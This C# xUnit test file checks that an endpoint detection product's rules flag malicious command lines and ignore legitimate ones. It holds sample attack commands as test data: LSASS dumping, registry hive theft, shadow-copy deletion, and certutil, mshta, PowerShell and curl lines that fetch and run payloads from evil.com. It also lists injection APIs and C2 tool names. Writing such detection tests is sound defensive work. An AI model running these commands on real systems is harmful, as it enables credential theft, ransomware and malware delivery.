using System;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Real-world attack pattern integration tests verifying detection rules
    /// fire correctly against known-malicious command lines and do not fire
    /// against legitimate system operations.
    /// </summary>
    public class AttackPatternTests
    {
        private static FusedTelemetryContext MakeContext(TelemetryEvent te)
        {
            return new FusedTelemetryContext
            {
                ProcessId = te.ProcessId,
                ProcessName = te.ProcessName,
                TriggeringEvent = te
            };
        }

        #region Credential Theft Patterns

        [Theory]
        [InlineData("procdump.exe -ma lsass.exe lsass_dump.dmp")]
        [InlineData("taskmgr_dump lsass minidump")]
        [InlineData("out-minidump lsass")]
        public void CredentialTheft_LsassDump_Detected(string cmd)
        {
            var rule = new LsassAccessRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "tool.exe", ProcessId = 1,
                ImagePath = @"C:\Temp\tool.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.LsassAccess, result!.SignalType);
        }

        [Theory]
        [InlineData("reg.exe save HKLM\\SAM C:\\temp\\sam.hiv")]
        [InlineData("reg save HKLM\\SECURITY sec.hiv")]
        [InlineData("reg save HKLM\\SYSTEM sys.hiv")]
        public void CredentialTheft_RegistrySave_SamHive(string cmd)
        {
            // SAM hive extraction should trigger detection rules
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "reg.exe", ProcessId = 2,
                ImagePath = @"C:\Windows\System32\reg.exe", CommandLine = cmd
            }));
            // Some of these may fire depending on the exact patterns
            // At minimum they should be detectable by script or attack tools rules
        }

        #endregion

        #region Ransomware Patterns

        [Theory]
        [InlineData("vssadmin.exe delete shadows /all /quiet")]
        [InlineData("VSSADMIN DELETE SHADOWS /FOR=C:")]
        public void Ransomware_ShadowCopyDeletion(string cmd)
        {
            var rule = new RansomwareDetectionRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "vssadmin.exe", ProcessId = 3,
                ImagePath = @"C:\Windows\System32\vssadmin.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
            Assert.True(result!.Confidence >= 0.95);
        }

        [Theory]
        [InlineData(".locked")]
        [InlineData(".enc")]
        [InlineData(".crypto")]
        public void Ransomware_FileRename_SuspiciousExtension(string ext)
        {
            var rule = new RansomwareDetectionRule();
            var result = rule.Evaluate(MakeContext(new FileActivityTelemetry
            {
                ProcessName = "locker.exe", ProcessId = 4,
                OperationType = "RENAME",
                FilePath = @"C:\Users\Admin\Documents\budget.xlsx",
                TargetPath = $@"C:\Users\Admin\Documents\budget.xlsx{ext}"
            }));
            Assert.NotNull(result);
        }

        [Fact]
        public void Ransomware_NormalRename_NoDetection()
        {
            var rule = new RansomwareDetectionRule();
            var result = rule.Evaluate(MakeContext(new FileActivityTelemetry
            {
                ProcessName = "word.exe", ProcessId = 5,
                OperationType = "RENAME",
                FilePath = @"C:\Users\Admin\~$document.docx",
                TargetPath = @"C:\Users\Admin\document.docx"
            }));
            Assert.Null(result);
        }

        #endregion

        #region LOLBin Abuse Patterns

        [Theory]
        [InlineData("certutil -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\p.exe")]
        [InlineData("certutil -decode encoded.txt payload.exe")]
        public void LOLBin_Certutil_Download(string cmd)
        {
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "certutil.exe", ProcessId = 6,
                ImagePath = @"C:\Windows\System32\certutil.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
        }

        [Theory]
        [InlineData("mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd\"\"\")")]
        [InlineData("mshta http://evil.com/payload.hta")]
        [InlineData("mshta javascript:a=GetObject('script:http://evil.com/s.sct')")]
        public void LOLBin_Mshta_Execution(string cmd)
        {
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "mshta.exe", ProcessId = 7,
                ImagePath = @"C:\Windows\System32\mshta.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
        }

        [Theory]
        [InlineData("regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll")]
        [InlineData("regsvr32 /s /n /i:http://evil.com/file.sct scrobj.dll")]
        [InlineData("regsvr32 /i:http://evil.com/file.sct scrobj.dll")]
        public void LOLBin_Regsvr32_Scrobj(string cmd)
        {
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "regsvr32.exe", ProcessId = 8,
                ImagePath = @"C:\Windows\System32\regsvr32.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
        }

        [Theory]
        [InlineData("wmic process call create \"cmd.exe /c calc.exe\"")]
        [InlineData("wmic /node:192.168.1.5 process call create notepad")]
        public void LOLBin_Wmic_ProcessCreate(string cmd)
        {
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "wmic.exe", ProcessId = 9,
                ImagePath = @"C:\Windows\System32\wmic.exe", CommandLine = cmd
            }));
            Assert.NotNull(result);
        }

        #endregion

        #region Process Injection Patterns

        [Theory]
        [InlineData("VirtualAllocEx")]
        [InlineData("WriteProcessMemory")]
        [InlineData("NtAllocateVirtualMemory")]
        [InlineData("NtWriteVirtualMemory")]
        [InlineData("CreateRemoteThread")]
        [InlineData("RtlCreateUserThread")]
        [InlineData("NtMapViewOfSection")]
        [InlineData("MapViewOfSection")]
        [InlineData("QueueUserAPC")]
        [InlineData("NtQueueApcThread")]
        [InlineData("SetThreadContext")]
        [InlineData("NtSetContextThread")]
        public void Injection_AllKnownAPIs_Detected(string api)
        {
            var rule = new ThreatIntelInjectionRule();
            var result = rule.Evaluate(MakeContext(new ThreatIntelTelemetry
            {
                ProcessName = "injector.exe", ProcessId = 10,
                TargetProcessId = 1000, ApiName = api
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.ProcessInjection, result!.SignalType);
        }

        [Theory]
        [InlineData("chrome")]
        [InlineData("msedge")]
        [InlineData("firefox")]
        [InlineData("brave")]
        [InlineData("opera")]
        [InlineData("vivaldi")]
        [InlineData("electron")]
        public void Injection_BrowserExemption_NoFire(string browser)
        {
            var rule = new ThreatIntelInjectionRule();
            var result = rule.Evaluate(MakeContext(new ThreatIntelTelemetry
            {
                ProcessName = browser, ProcessId = 11,
                TargetProcessId = 12, ApiName = "VirtualAllocEx"
            }));
            Assert.Null(result);
        }

        #endregion

        #region C2 Frameworks

        [Theory]
        [InlineData("cobalt")]
        [InlineData("cobeacon")]
        [InlineData("beacon.dll")]
        [InlineData("meterpreter")]
        [InlineData("msfvenom")]
        public void C2Framework_ToolDetection(string pattern)
        {
            var rule = new AttackToolsRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "svchost.exe", ProcessId = 12,
                ImagePath = @"C:\Temp\svchost.exe",
                CommandLine = $"svchost.exe {pattern} beacon"
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.NetworkC2, result!.SignalType);
        }

        #endregion

        #region False Positive Prevention

        [Theory]
        [InlineData("chrome.exe", @"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer")]
        [InlineData("svchost.exe", @"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p")]
        [InlineData("explorer.exe", @"C:\Windows\explorer.exe", "explorer.exe")]
        [InlineData("notepad.exe", @"C:\Windows\System32\notepad.exe", "notepad.exe C:\\readme.txt")]
        public void FalsePositive_LegitProcesses_NoDetection(string name, string path, string cmd)
        {
            var rules = new IDetectionRule[]
            {
                new LsassAccessRule(),
                new RansomwareDetectionRule(),
                new ReverseShellRule(),
                new AttackToolsRule(),
                new PrivilegeEscalationRule()
            };

            var pt = new ProcessTelemetry
            {
                ProcessName = name, ProcessId = 50,
                ImagePath = path, CommandLine = cmd,
                ParentProcessName = "explorer.exe"
            };

            foreach (var rule in rules)
            {
                var result = rule.Evaluate(MakeContext(pt));
                Assert.Null(result);
            }
        }

        [Theory]
        [InlineData("powershell.exe", "powershell.exe -Command Get-Process")]
        [InlineData("powershell.exe", "powershell.exe -File script.ps1")]
        [InlineData("cmd.exe", "cmd.exe /c dir C:\\")]
        [InlineData("cmd.exe", "cmd.exe /c echo hello")]
        public void FalsePositive_NormalShellUsage_NoKill(string name, string cmd)
        {
            var rule = new ReverseShellRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = name, ProcessId = 60,
                ImagePath = $@"C:\Windows\System32\{name}", CommandLine = cmd
            }));
            Assert.Null(result);
        }

        [Theory]
        [InlineData("vssadmin.exe", "vssadmin list shadows")]
        [InlineData("vssadmin.exe", "vssadmin list providers")]
        [InlineData("vssadmin.exe", "vssadmin resize shadowstorage")]
        public void FalsePositive_VssadminLegitUse_NoDetection(string name, string cmd)
        {
            var rule = new RansomwareDetectionRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = name, ProcessId = 70,
                ImagePath = @"C:\Windows\System32\vssadmin.exe", CommandLine = cmd
            }));
            Assert.Null(result);
        }

        #endregion

        #region ClickFix Campaign Patterns (2025-2026)

        [Theory]
        [InlineData("powershell.exe", "powershell.exe -w hidden Invoke-WebRequest http://evil.com/dl -OutFile C:\\temp\\p.exe; Start-Process C:\\temp\\p.exe", "explorer.exe")]
        [InlineData("powershell.exe", "powershell.exe -nop Invoke-Expression (irm http://evil.com/s)", "chrome.exe")]
        [InlineData("cmd.exe", "cmd.exe /c curl http://evil.com/payload.exe -o C:\\temp\\p.exe && C:\\temp\\p.exe", "msedge.exe")]
        public void ClickFix_RealCampaignPatterns_Detected(string proc, string cmd, string parent)
        {
            var rule = new ClickFixDetectionRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = proc, ProcessId = 80,
                ImagePath = $@"C:\Windows\System32\{proc}", CommandLine = cmd,
                ParentProcessName = parent
            }));
            Assert.NotNull(result);
            Assert.Equal(ResponseAction.KillProcessTree, result!.AuthorizedResponse);
        }

        #endregion

        #region npm Supply Chain Attacks (2025)

        [Theory]
        [InlineData("npm.exe", "powershell.exe", "powershell -enc ABc= -w hidden https://evil.com")]
        [InlineData("yarn.exe", "cmd.exe", "cmd /c certutil -urlcache -f https://evil.com/p.exe p.exe")]
        [InlineData("pnpm.exe", "curl.exe", "curl -o payload.exe https://evil.com/steal")]
        public void NpmSupplyChain_MaliciousPostinstall_Detected(string parent, string child, string cmd)
        {
            var rule = new NpmSupplyChainRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = child, ProcessId = 90,
                ImagePath = $@"C:\Windows\System32\{child}", CommandLine = cmd,
                ParentProcessName = parent
            }));
            Assert.NotNull(result);
        }

        #endregion
    }
}
